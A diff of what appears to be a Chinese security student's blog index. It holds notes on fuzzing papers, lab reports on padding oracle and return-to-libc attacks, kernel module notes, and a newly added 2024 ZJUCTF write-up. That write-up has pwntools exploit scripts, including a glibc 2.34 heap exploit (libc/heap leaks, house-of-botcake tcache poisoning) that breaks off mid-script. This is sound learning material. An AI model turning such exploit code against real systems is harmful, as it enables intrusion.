-    <content><![CDATA[<h1 id="Fudge-Fuzz-Driver-Generation-at-Scale"><a href="#Fudge-Fuzz-Driver-Generation-at-Scale" class="headerlink" title="Fudge: Fuzz Driver Generation at Scale"></a>Fudge: Fuzz Driver Generation at Scale</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>google针对c与c++库提出了新的fuzz driver自动化生成方式。</p>
+    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>google针对c与c++库提出了新的fuzz driver自动化生成方式。</p>
 <h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对C&#x2F;C++库代码片段的slice_based_fuzz。</p>
 <h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>基于google海量代码库进行测试，完成了Fudge可以有效的处理海量的代码。发现其中的安全漏洞</p>
 <h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><p>fuzz基于源代码，可以考虑在编译源代码为可执行文件后加入动态符号执行等技术。（也在其Future Work中体现（还提到了Machine Learning））</p>
@@ -1595,7 +1595,7 @@
   <entry>
     <title>Fuzzware复现</title>
     <url>/posts/6b4c8ab1.html</url>
-    <content><![CDATA[<h1 id="Fuzzware论文复现"><a href="#Fuzzware论文复现" class="headerlink" title="Fuzzware论文复现"></a>Fuzzware论文复现</h1><p>项目链接：<a href="https://github.com/fuzzware-fuzzer/fuzzware">https://github.com/fuzzware-fuzzer/fuzzware</a></p>
+    <content><![CDATA[<p>项目链接：<a href="https://github.com/fuzzware-fuzzer/fuzzware">https://github.com/fuzzware-fuzzer/fuzzware</a></p>
 <h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu22.04</p>
 <p>docker</p>
 <p>具体过程比较简单，可以直接看github readme</p>
@@ -1619,7 +1619,7 @@
   <entry>
     <title>Winnie论文笔记</title>
     <url>/posts/ce05e772.html</url>
-    <content><![CDATA[<h1 id="Winnie"><a href="#Winnie" class="headerlink" title="Winnie"></a>Winnie</h1><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对当下Windows系统软件的fuzz没有合适的方法。提出了Winnie对Windows闭源软件进行fuzzing。</p>
+    <content><![CDATA[<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对当下Windows系统软件的fuzz没有合适的方法。提出了Winnie对Windows闭源软件进行fuzzing。</p>
 <h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
 <li>提出了Winnie，可以对Windows闭源软件进行模糊测试</li>
 <li>实现了windows系统的fork方法，使得可以不用每次执行都得从头开始，提高了fuzzing效率，其中fork新进程的速度达到310次&#x2F;s显著高于windows自带CreateProcess91.9次&#x2F;s，与WSL的fork速度相近。</li>
@@ -1660,7 +1660,7 @@
   <entry>
     <title>【网络攻防大作业】Open_the_Floodgate实验报告</title>
     <url>/posts/5e4ccf7.html</url>
-    <content><![CDATA[<h2 id="Open-the-Floodgate-WriteUp"><a href="#Open-the-Floodgate-WriteUp" class="headerlink" title="Open_the_Floodgate WriteUp"></a>Open_the_Floodgate WriteUp</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>修改Flag为学号</p>
+    <content><![CDATA[<h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>修改Flag为学号</p>
 <p>运行docker程序<code>sudo ./dockerHelper.sh -k</code>（注：需要<code>chmod +x</code>修改脚本的权限），访问<a href="http://127.0.0.1:3580/%EF%BC%8C%E7%95%8C%E9%9D%A2%E5%A6%82%E4%B8%8B">http://127.0.0.1:3580/，界面如下</a></p>
 <p><img src="/images/2024-1-1-Open_the_Floodgate.assets/image-20231231132934965.png" alt="image-20231231132934965"></p>
 <h3 id="2-流量监测"><a href="#2-流量监测" class="headerlink" title="2.流量监测"></a>2.流量监测</h3><p>执行curl.sh脚本，curl.sh脚本如下：可以看到对web网页的多个网址进行扫描。</p>
@@ -1688,7 +1688,7 @@
   <entry>
     <title>【网络攻防大作业】Magic Padding Oracle实验报告</title>
     <url>/posts/8f883717.html</url>
-    <content><![CDATA[<h2 id="Magic-Padding-Oracle-WriteUp"><a href="#Magic-Padding-Oracle-WriteUp" class="headerlink" title="Magic Padding Oracle WriteUp"></a>Magic Padding Oracle WriteUp</h2><p>无需搭建环境、直接连接服务器<code>nc 202.120.1.66 1069</code></p>
+    <content><![CDATA[<p>无需搭建环境、直接连接服务器<code>nc 202.120.1.66 1069</code></p>
 <p>服务器程序会判断客户端发送的密文填充是否有效，如果有效，则提取解密的cookie信息，并判断其中的<code>&quot;is_admin&quot;</code>和<code>&quot;exptime&quot;</code>是否符合要求，如果满足要求，则打印flag值。因此本实验任务为构造合适的密文。</p>
 <h3 id="Padding-Oracle攻击"><a href="#Padding-Oracle攻击" class="headerlink" title="Padding Oracle攻击"></a>Padding Oracle攻击</h3><p><code>nc 202.120.1.66 1069</code>连接到服务器，输入示例cookie，结果如下。</p>
 <p>&#x2F;images&#x2F;<img src="/images/2024-1-1-Padding_Oracle.assets/image-20231231160545230.png" alt="image-20231231160545230"></p>
@@ -1714,7 +1714,7 @@
   <entry>
     <title>【网络攻防大作业】Magic Padding Oracle实验报告</title>
     <url>/posts/8f883717.html</url>
-    <content><![CDATA[<h1 id="Padding-Oracle实验报告"><a href="#Padding-Oracle实验报告" class="headerlink" title="Padding Oracle实验报告"></a>Padding Oracle实验报告</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1. Overview"></a>1. Overview</h2><p>Padding Oracle：一些系统在解密密文时，会先验证其填充是否合法，如果不合法则会抛出异常。针对此行为的攻击即为padding oracle攻击</p>
+    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1. Overview"></a>1. Overview</h2><p>Padding Oracle：一些系统在解密密文时，会先验证其填充是否合法，如果不合法则会抛出异常。针对此行为的攻击即为padding oracle攻击</p>
 <h2 id="2-Lab-Environment"><a href="#2-Lab-Environment" class="headerlink" title="2. Lab Environment"></a>2. Lab Environment</h2><ul>
 <li>Seed虚拟机</li>
 <li>Labsetup.zip</li>
@@ -1761,7 +1761,7 @@
   <entry>
     <title>Kernel Pwn 学习之路(一)</title>
     <url>/posts/54828bfc.html</url>
-    <content><![CDATA[<h1 id="Kernel-Pwn-学习之路-一"><a href="#Kernel-Pwn-学习之路-一" class="headerlink" title="Kernel Pwn 学习之路(一)"></a>Kernel Pwn 学习之路(一)</h1><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/140338884">Kernel Pwn 学习之路（一）</a></p>
+    <content><![CDATA[<p>参考链接：<a href="https://zhuanlan.zhihu.com/p/140338884">Kernel Pwn 学习之路（一）</a></p>
 <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文主要介绍Kernel的相关知识以及栈溢出在Kernel中的利用。</p>
 <h2 id="2-Kernel简介"><a href="#2-Kernel简介" class="headerlink" title="2. Kernel简介"></a>2. Kernel简介</h2><p><strong>本部分全文引用了CTF-Wiki的相关内容。</strong></p>
 <h3 id="2-1-什么是Kernel"><a href="#2-1-什么是Kernel" class="headerlink" title="2.1 什么是Kernel"></a>2.1 什么是Kernel</h3><p>kernel也是一个程序，用来管理软件发出的数据I&#x2F;O请求，讲这些要求转译为指令，交给CPU和计算机中的其他组件处理，kernel是现代操作系统最基本的部分。</p>
@@ -1864,9 +1864,23 @@
       </tags>
   </entry>
   <entry>
+    <title>模糊测试分类</title>
+    <url>/posts/34143959.html</url>
+    <content><![CDATA[<p>根据程序执行反馈的获取情况，可以将模糊测试分为白盒、黑盒和灰盒三类</p>
+<h2 id="一、白盒测试"><a href="#一、白盒测试" class="headerlink" title="一、白盒测试"></a>一、白盒测试</h2><p>白盒测试通过分析被测程序的内部机制和执行被测程序时收集的信息来生成测试用例，白盒测试通常会对程序进行动态污点分析或符号执行以获取精确的程序分析和状态信息。</p>
+<h2 id="二、黑盒测试"><a href="#二、黑盒测试" class="headerlink" title="二、黑盒测试"></a>二、黑盒测试</h2><p>黑盒测试将测试对象当作黑盒，按照指定的规范随机生成测试用例。不提前分析程序内部机制也不接受反馈信息来更新测试用例。</p>
+<h2 id="三、灰盒测试"><a href="#三、灰盒测试" class="headerlink" title="三、灰盒测试"></a>三、灰盒测试</h2><p>灰盒测试的典型特点就是可以使用目标的执行反馈来指导测试用例的生成。</p>
+<p><img src="/images/2024-1-3-%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%88%86%E7%B1%BB.assets/image-20240103104937168.png" alt="image-20240103104937168"></p>
+]]></content>
+      <tags>
+        <tag>Fuzz</tag>
+        <tag>模糊测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【网络攻防大作业】Return_to_libc实验报告</title>
     <url>/posts/8a8d28bf.html</url>
-    <content><![CDATA[<h2 id="Return-to-libc-WriteUp"><a href="#Return-to-libc-WriteUp" class="headerlink" title="Return_to_libc WriteUp"></a>Return_to_libc WriteUp</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h3><ul>
+    <content><![CDATA[<h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h3><ul>
 <li><p>修改flag为学号</p>
 </li>
 <li><p>构建docker镜像（运行<code>sudo ./build.sh</code>，注意<code>chmod +x</code>修改权限），连接不稳定，可能需要多次尝试</p>
@@ -1921,23 +1935,29 @@
       </tags>
   </entry>
   <entry>
-    <title>模糊测试分类</title>
-    <url>/posts/34143959.html</url>
-    <content><![CDATA[<h1 id="模糊测试分类"><a href="#模糊测试分类" class="headerlink" title="模糊测试分类"></a>模糊测试分类</h1><p>根据程序执行反馈的获取情况，可以将模糊测试分为白盒、黑盒和灰盒三类</p>
-<h2 id="一、白盒测试"><a href="#一、白盒测试" class="headerlink" title="一、白盒测试"></a>一、白盒测试</h2><p>白盒测试通过分析被测程序的内部机制和执行被测程序时收集的信息来生成测试用例，白盒测试通常会对程序进行动态污点分析或符号执行以获取精确的程序分析和状态信息。</p>
-<h2 id="二、黑盒测试"><a href="#二、黑盒测试" class="headerlink" title="二、黑盒测试"></a>二、黑盒测试</h2><p>黑盒测试将测试对象当作黑盒，按照指定的规范随机生成测试用例。不提前分析程序内部机制也不接受反馈信息来更新测试用例。</p>
-<h2 id="三、灰盒测试"><a href="#三、灰盒测试" class="headerlink" title="三、灰盒测试"></a>三、灰盒测试</h2><p>灰盒测试的典型特点就是可以使用目标的执行反馈来指导测试用例的生成。</p>
-<p><img src="/images/2024-1-3-%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%88%86%E7%B1%BB.assets/image-20240103104937168.png" alt="image-20240103104937168"></p>
+    <title>DSE论文笔记</title>
+    <url>/posts/25083369.html</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
+<h3 id="SIMPIL"><a href="#SIMPIL" class="headerlink" title="SIMPIL"></a>SIMPIL</h3><p><img src="/images/2024-1-5-DSE%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20240105122737426.png" alt="image-20240105122737426"></p>
+<p><img src="/images/2024-1-5-DSE%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20240105122751384.png" alt="image-20240105122751384"></p>
+<h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p><strong>动态污点分析</strong>：跟踪源头与sink点的信息流。任何由污染源推导的值都是污点（T），其他值看作未污染。</p>
+<p><strong>两种错误：</strong></p>
+<ul>
+<li>overtainted：假阳性</li>
+<li>undertainting：假阴性</li>
+</ul>
+<h3 id="动态污点分析策略"><a href="#动态污点分析策略" class="headerlink" title="动态污点分析策略"></a>动态污点分析策略</h3><h4 id="Taint-Introduction"><a href="#Taint-Introduction" class="headerlink" title="Taint Introduction"></a>Taint Introduction</h4><p>将用户输入作为污染源</p>
+<h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
+<h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
 ]]></content>
       <tags>
-        <tag>Fuzz</tag>
-        <tag>模糊测试</tag>
+        <tag>DSE</tag>
       </tags>
   </entry>
   <entry>
     <title>Linux内核模块</title>
     <url>/posts/b78b50e.html</url>
-    <content><![CDATA[<h1 id="Linux内核模块"><a href="#Linux内核模块" class="headerlink" title="Linux内核模块"></a>Linux内核模块</h1><h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
+    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
 <ul>
 <li>包括编译器、链接器、binutils、glibc、头文件</li>
 <li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
@@ -1970,7 +1990,7 @@
   <entry>
     <title>LKM编程</title>
     <url>/posts/79c0f484.html</url>
-    <content><![CDATA[<h1 id="LKM编程"><a href="#LKM编程" class="headerlink" title="LKM编程"></a>LKM编程</h1><h2 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1. Introduction"></a>Chapter 1. Introduction</h2><h3 id="1-1-What-Is-A-Kernel-Module"><a href="#1-1-What-Is-A-Kernel-Module" class="headerlink" title="1.1. What Is A Kernel Module?"></a>1.1. What Is A Kernel Module?</h3><p><strong>Linux系统内核：</strong>宏内核（与微内核相对），使用内核模块实现动态模块的加载运行。</p>
+    <content><![CDATA[<h2 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1. Introduction"></a>Chapter 1. Introduction</h2><h3 id="1-1-What-Is-A-Kernel-Module"><a href="#1-1-What-Is-A-Kernel-Module" class="headerlink" title="1.1. What Is A Kernel Module?"></a>1.1. What Is A Kernel Module?</h3><p><strong>Linux系统内核：</strong>宏内核（与微内核相对），使用内核模块实现动态模块的加载运行。</p>
 <table>
 <thead>
 <tr>
@@ -2227,29 +2247,92 @@
       </tags>
   </entry>
   <entry>
-    <title>DSE论文笔记</title>
-    <url>/posts/25083369.html</url>
-    <content><![CDATA[<h1 id="DSE论文笔记"><a href="#DSE论文笔记" class="headerlink" title="DSE论文笔记"></a>DSE论文笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
-<h3 id="SIMPIL"><a href="#SIMPIL" class="headerlink" title="SIMPIL"></a>SIMPIL</h3><p><img src="/images/2024-1-5-DSE%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20240105122737426.png" alt="image-20240105122737426"></p>
-<p><img src="/images/2024-1-5-DSE%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20240105122751384.png" alt="image-20240105122751384"></p>
-<h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p><strong>动态污点分析</strong>：跟踪源头与sink点的信息流。任何由污染源推导的值都是污点（T），其他值看作未污染。</p>
-<p><strong>两种错误：</strong></p>
+    <title>2024 ZJUCTF WriteUp</title>
+    <url>/posts/dc126860.html</url>
+    <content><![CDATA[<p>本次校赛题目质量不错，难度设置比较合适，属于是看到感觉可以试一试的程度。其中*A口算很有趣！强烈推荐！！！</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="小A口算"><a href="#小A口算" class="headerlink" title="小A口算"></a>小A口算</h3><p>该题目会随机生成20以内的数字比较，可以构造脚本在1分钟内刷够足够分数，从而获取flag</p>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">38981</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Try your best to answer questions as much as possible!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    challenge = (p.recvline()).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    v1 = challenge.split(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    v1[<span class="number">0</span>] = <span class="built_in">int</span>(v1[<span class="number">0</span>])</span><br><span class="line">    v1[<span class="number">1</span>] = <span class="built_in">int</span>(v1[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    info(v1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Correct! Your score is&quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功获取flag: <code>ZJUCTF&#123;WoW_K1n6_0F_5h0-g4Ku-s31_4r1thm3t1c&#125;</code></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="cake-bot"><a href="#cake-bot" class="headerlink" title="cake_bot"></a>cake_bot</h3><p>保护全开，libc版本2.34<br>其中保存了两个列表（或者说一个结构体列表），列表长度限制为16</p>
 <ul>
-<li>overtainted：假阳性</li>
-<li>undertainting：假阴性</li>
+<li><code>cake_list</code>: 保存malloc的cake地址</li>
+<li><code>cake_size_list</code>: 保存cake的size</li>
 </ul>
-<h3 id="动态污点分析策略"><a href="#动态污点分析策略" class="headerlink" title="动态污点分析策略"></a>动态污点分析策略</h3><h4 id="Taint-Introduction"><a href="#Taint-Introduction" class="headerlink" title="Taint Introduction"></a>Taint Introduction</h4><p>将用户输入作为污染源</p>
-<h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
-<h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
+<p>其中定义了Add，Show, Delete函数</p>
+<ul>
+<li>Add函数：申请新的cake，可以选择存放在列表的index，申请前检查index是否超过16，或者申请size是否不为0；然后定义cakesize，malloc对应大小的cake，然后读取对应大小的输入。</li>
+<li>Show函数：检查对应index的cake内容；</li>
+<li>Delete函数：释放对应的index的cake，这里没有将cake_list对应index堆地址置0，而且将size置0，因此可以delete后add该index。之后就可以泄露libc等内容。</li>
+</ul>
+<p><strong>思路</strong>：通过unsortedbin attack泄漏libc地址，也可以通过tcachebin泄露heap地址，还可以通过house of botcake获取栈environ地址。接下来就是通过house of botcake构造rop写入栈返回地址了</p>
+<p><code>exp</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choose a box to pack the cake:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input size of shipping address:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input your address:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index of box to check:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index of box to send:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./cakebot&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">44907</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x0000000000001346)&quot;)</span></span><br><span class="line"><span class="comment"># chunk0 index0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk0 index0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk1 index1</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x20</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;This box will be sent to:\n\x00&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x203d0a</span></span><br><span class="line">info(<span class="string">f&#x27;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x110</span>-<span class="number">6</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) * <span class="number">0x1000</span></span><br><span class="line">info(<span class="string">f&#x27;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">environ_addr = (libc_addr + <span class="number">0x20ad58</span> - <span class="number">0x38</span>) ^ (heap_addr // <span class="number">0x1000</span>)</span><br><span class="line">info(<span class="string">f&#x27;environ_addr: <span class="subst">&#123;<span class="built_in">hex</span>(environ_addr)&#125;</span>&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># house of botcake tcache attack to leak stack_addr</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x20</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, environ_addr))</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x100</span>, flat(<span 